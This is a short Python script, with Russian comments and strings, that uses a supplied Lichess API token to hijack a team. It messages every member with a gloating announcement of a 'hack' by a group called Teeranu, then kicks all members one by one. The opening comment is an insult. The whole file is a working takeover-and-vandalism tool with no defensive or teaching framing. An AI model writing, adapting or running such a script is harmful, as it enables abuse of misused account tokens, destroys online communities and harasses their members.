# шиш салоед. И это факт, который нельзя опровергнуть.

import berserk
import requests
import ndjson

token = input("Вставьте токен : ")
team = input("Код команды(ссылка, которая идет после https://lichess.org/team/...) : ")

msg = """
Привет. Это взлом от Teeranu, нашей группы, которая активно ведет разработку
программ для захвата клубов. Любой аккаунт, используемый для захвата
этого клуба, скорее всего, будет удален через несколько минут. Желаем
вам удачи, и спасибо за вашу не осторожность, она стоила вам клуба. 

#НетШишизму!

С "уважением", Teeranu."""
heads = {'Authorization': f'Bearer {token}'}

session = berserk.TokenSession(token)
client = berserk.Client(session=session)

r = requests.get('https://lichess.org/api/team/'+team+'/users')
data = r.json(cls=ndjson.Decoder)

requests.post('https://lichess.org/team/'+team+'/pm-all', data={'message': msg}, headers=heads).json()

for i in data:
    user = i['id']
    client.teams.kick_member(team, user)
    print(f"{user} кикнут")
